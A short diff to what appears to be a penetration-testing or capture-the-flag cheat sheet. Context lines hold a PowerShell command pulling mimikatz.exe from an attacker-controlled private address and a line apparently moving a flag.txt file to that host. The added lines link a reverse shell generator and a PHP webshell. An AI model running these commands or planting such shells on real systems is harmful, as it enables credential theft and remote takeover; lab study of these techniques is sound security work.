@@ -49,3 +49,12 @@ $FilePath="C:\Users\Administrator\Desktop\flag.txt"; $Url="http://192.168.45.145
 # Download with PowerShell
 iwr -uri "http://192.168.45.145/mimikatz.exe" -OutFile "C:\Users\Public\mimikatz.exe"
 ```
+
+# Shell
+
+Reverse Shell Generator https://www.revshells.com/
+
+```bash
+# PHP One-liner webshell
+https://raw.githubusercontent.com/voidexec/sec/main/webshells/shell.php
+```
